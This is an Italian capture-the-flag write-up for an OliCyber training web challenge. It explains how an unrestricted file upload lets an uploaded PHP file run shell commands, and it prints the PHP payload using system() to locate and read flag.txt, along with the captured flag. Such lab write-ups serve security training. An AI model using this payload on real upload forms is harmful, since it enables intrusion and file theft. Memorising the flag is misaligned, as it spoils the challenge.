---
titolo: "Write-up: Shells' Revenge - Shell Injection"
data: 2026-09-22
categoria: Web
tags:
  - shell_injection
  - php
---
## 1. Informazioni Generali
* **Piattaforma:** [olicyber.training.it]
* **Difficoltà:** [Media] 
* **Risorsa:** [http://shellrevenge.challs.olicyber.it](http://shellrevenge.challs.olicyber.it)

## 2. Analisi delle vulnerabilità
Il sito permette di caricare file (non troppo grandi) e, una volta caricati, mostra un link per andare alla risorsa nella pagina. A questo punto si prova a caricare un file php che esegue comandi shell per poter navigare all'interno del sistema e cercare la flag, ottenendo un risultato positivo.
## 3. Exploitation
Si cerca di navigare fino alla radice tramite i comandi di sistema e si cerca il file con la flag per poi leggerlo. Il file php da caricare per poter fare ciò è il seguente:

```php
<?php
system('cd ..; cd ..; cd ..; cd ..; cd ..; find . -name "flag.txt"; ls; cat ./flag.txt')
?>
```
Cliccando il link per aprire la risorsa viene eseguito il codice e si ottiene stampata a schermo la flag:
```
flag{sh3l1_p0w3r_1s_k00p4_p0w3r}
```
